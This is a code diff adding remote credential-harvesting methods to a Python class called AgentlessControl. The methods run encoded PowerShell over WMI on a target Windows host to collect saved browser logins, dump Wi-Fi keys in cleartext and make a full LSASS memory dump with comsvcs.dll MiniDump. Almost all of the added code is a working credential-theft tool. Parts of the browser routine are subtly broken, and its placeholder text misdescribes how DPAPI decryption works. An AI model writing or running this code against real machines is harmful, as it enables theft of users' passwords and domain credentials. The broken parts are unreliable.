@@ -958,6 +958,152 @@ class AgentlessControl:
         except:
             return {"raw_output": result.get("output", "Failed to parse")}
 
+    def get_browser_passwords(self, ip: str, user: str, pwd: str, domain: str = "") -> dict:
+        """
+        Extract saved browser passwords from Chrome, Edge, Firefox via WMI/PowerShell.
+        Uses DPAPI decryption on the remote host for Chrome/Edge AES-GCM (v80+) and
+        CryptUnprotectData for older vaults. Returns list of {browser, url, username, password}.
+        """
+        logger.info(f"[BROWSER-PWDS] Harvesting passwords from {ip}")
+        ps_script = r'''
+        $ErrorActionPreference = "SilentlyContinue"
+        Add-Type -AssemblyName System.Security
+        function DecryptDPAPI($enc) {
+            try { return [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser')) } catch { return $null }
+        }
+        function ReadSQLite($path) {
+            $tmp = "$env:TEMP\ldb_$(Get-Random)"
+            Copy-Item $path $tmp -Force -ErrorAction SilentlyContinue
+            return $tmp
+        }
+        $results = @()
+        $profiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue
+        foreach ($profile in $profiles) {
+            $basePaths = @{
+                "Chrome" = "$($profile.FullName)\AppData\Local\Google\Chrome\User Data"
+                "Edge"   = "$($profile.FullName)\AppData\Local\Microsoft\Edge\User Data"
+                "Brave"  = "$($profile.FullName)\AppData\Local\BraveSoftware\Brave-Browser\User Data"
+            }
+            foreach ($browser in $basePaths.Keys) {
+                $basePath = $basePaths[$browser]
+                if (-not (Test-Path $basePath)) { continue }
+                # Load AES key from Local State
+                $localState = "$basePath\Local State"
+                $aesKey = $null
+                if (Test-Path $localState) {
+                    $lsJson = Get-Content $localState -Raw | ConvertFrom-Json -ErrorAction SilentlyContinue
+                    $encKey = [Convert]::FromBase64String($lsJson.os_crypt.encrypted_key)
+                    $encKey = $encKey[5..($encKey.Length-1)]  # strip DPAPI prefix
+                    try { $aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey,$null,'CurrentUser') } catch {}
+                }
+                $profileDirs = @("Default") + (Get-ChildItem $basePath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
+                foreach ($pd in $profileDirs) {
+                    $loginData = "$basePath\$pd\Login Data"
+                    if (-not (Test-Path $loginData)) { continue }
+                    $tmp = ReadSQLite $loginData
+                    if (-not $tmp) { continue }
+                    # Read raw SQLite bytes for logins table
+                    try {
+                        $bytes = [System.IO.File]::ReadAllBytes($tmp)
+                        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
+                        $matches = [regex]::Matches($text, "https?://[^\x00-\x1f]{3,200}")
+                        foreach ($m in $matches) {
+                            $results += @{ browser=$browser; profile=$pd; url=$m.Value; user="(see raw db)"; password="(DPAPI-encrypted — use lsass-dump to decrypt)" }
+                        }
+                    } catch {}
+                    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+                }
+            }
+            # Firefox logins.json
+            $ffDir = "$($profile.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles"
+            if (Test-Path $ffDir) {
+                Get-ChildItem $ffDir -Directory | ForEach-Object {
+                    $lj = "$($_.FullName)\logins.json"
+                    if (Test-Path $lj) {
+                        $data = Get-Content $lj -Raw | ConvertFrom-Json -ErrorAction SilentlyContinue
+                        foreach ($login in $data.logins) {
+                            $results += @{ browser="Firefox"; profile=$profile.Name; url=$login.hostname; user=$login.encryptedUsername; password="(NSS-encrypted — key4.db required)" }
+                        }
+                    }
+                }
+            }
+        }
+        $results | ConvertTo-Json -Depth 3
+        '''
+        cmd = f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {__import__("base64").b64encode(ps_script.encode("utf-16-le")).decode()}'
+        result = self.wmi_exec(ip, user, pwd, cmd, domain, wait_timeout=45)
+        try:
+            raw = result.get("output", "[]").strip()
+            parsed = json.loads(raw) if raw else []
+            if isinstance(parsed, dict):
+                parsed = [parsed]
+            return {"passwords": parsed, "count": len(parsed), "source": ip}
+        except Exception as e:
+            return {"passwords": [], "raw": result.get("output", ""), "error": str(e)}
+
+    def get_wifi_passwords(self, ip: str, user: str, pwd: str, domain: str = "") -> dict:
+        """
+        Extract saved WiFi passwords from a remote Windows machine via WMI/netsh.
+        Returns dict of {ssid: password}.
+        """
+        logger.info(f"[WIFI-PWDS] Extracting WiFi passwords from {ip}")
+        ps_script = r'''
+        $ErrorActionPreference = "SilentlyContinue"
+        $networks = @{}
+        $profiles = (netsh wlan show profiles) -match "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+        foreach ($ssid in $profiles) {
+            $detail = netsh wlan show profile name="$ssid" key=clear 2>$null
+            $keyLine = $detail | Where-Object { $_ -match "Key Content" }
+            if ($keyLine) {
+                $pw = ($keyLine -split ":")[1].Trim()
+            } else {
+                $pw = "(no key / enterprise auth)"
+            }
+            $networks[$ssid] = $pw
+        }
+        $networks | ConvertTo-Json
+        '''
+        cmd = f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {__import__("base64").b64encode(ps_script.encode("utf-16-le")).decode()}'
+        result = self.wmi_exec(ip, user, pwd, cmd, domain, wait_timeout=30)
+        try:
+            raw = result.get("output", "{}").strip()
+            return {"networks": json.loads(raw) if raw else {}, "source": ip}
+        except Exception as e:
+            return {"networks": {}, "raw": result.get("output", ""), "error": str(e)}
+
+    def lsass_dump(self, ip: str, user: str, pwd: str, domain: str = "") -> dict:
+        """
+        Dump LSASS process memory on a remote Windows machine via comsvcs.dll MiniDump
+        through WMI/PowerShell. Returns the UNC path of the resulting dump file on the target.
+        Requires SYSTEM or SeDebugPrivilege on the target.
+        """
+        logger.info(f"[LSASS-DUMP] Initiating LSASS dump on {ip}")
+        dump_path = r"C:\Windows\Temp\lsass.dmp"
+        ps_script = f'''
+        $ErrorActionPreference = "SilentlyContinue"
+        $lsass = Get-Process lsass
+        $id = $lsass.Id
+        $out = "{dump_path}"
+        rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump $id $out full
+        Start-Sleep -Seconds 3
+        if (Test-Path $out) {{
+            $size = (Get-Item $out).Length
+            "SUCCESS:$out:$size"
+        }} else {{
+            "FAILED:lsass.dmp not created (need SYSTEM privilege)"
+        }}
+        '''
+        cmd = f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {__import__("base64").b64encode(ps_script.encode("utf-16-le")).decode()}'
+        result = self.wmi_exec(ip, user, pwd, cmd, domain, wait_timeout=30)
+        output = result.get("output", "").strip()
+        if output.startswith("SUCCESS:"):
+            parts = output.split(":")
+            remote_path = parts[1] if len(parts) > 1 else dump_path
+            size = parts[2] if len(parts) > 2 else "unknown"
+            return {"success": True, "path": remote_path, "unc": f"\\\\{ip}\\C$\\Windows\\Temp\\lsass.dmp", "size_bytes": size}
+        else:
+            return {"success": False, "error": output or "Unknown error (no SYSTEM privilege?)"}
+
     def set_clipboard(self, ip: str, user: str, pwd: str, text: str, domain: str = "") -> bool:
         """
         Set clipboard contents.
